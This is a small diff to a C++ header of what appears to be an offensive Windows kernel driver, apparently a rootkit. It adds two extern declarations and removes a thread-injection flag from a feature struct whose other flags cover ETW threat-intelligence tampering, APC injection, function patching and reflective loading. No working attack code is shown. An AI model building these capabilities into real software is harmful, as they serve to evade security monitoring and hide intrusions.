@@ -16,6 +16,11 @@ constexpr VOID Print(...) {};
 // Globals.
 inline PVOID RegistrationHandle = NULL;
 
+extern "C" {
+    extern ULONG WindowsBuildNumber;
+    extern PVOID AllocatePool2;
+}
+
 struct EnabledFeatures {
 	bool DriverReflectivelyLoaded = false;
 	bool FunctionPatching = true;
@@ -28,7 +33,6 @@ struct EnabledFeatures {
 	bool FileProtection = true;
 	bool EtwTiTamper = true;
 	bool ApcInjection = true;
-	bool CreateThreadInjection = false;
 	bool AutoModuleUnload = true;
 };
 inline EnabledFeatures Features;
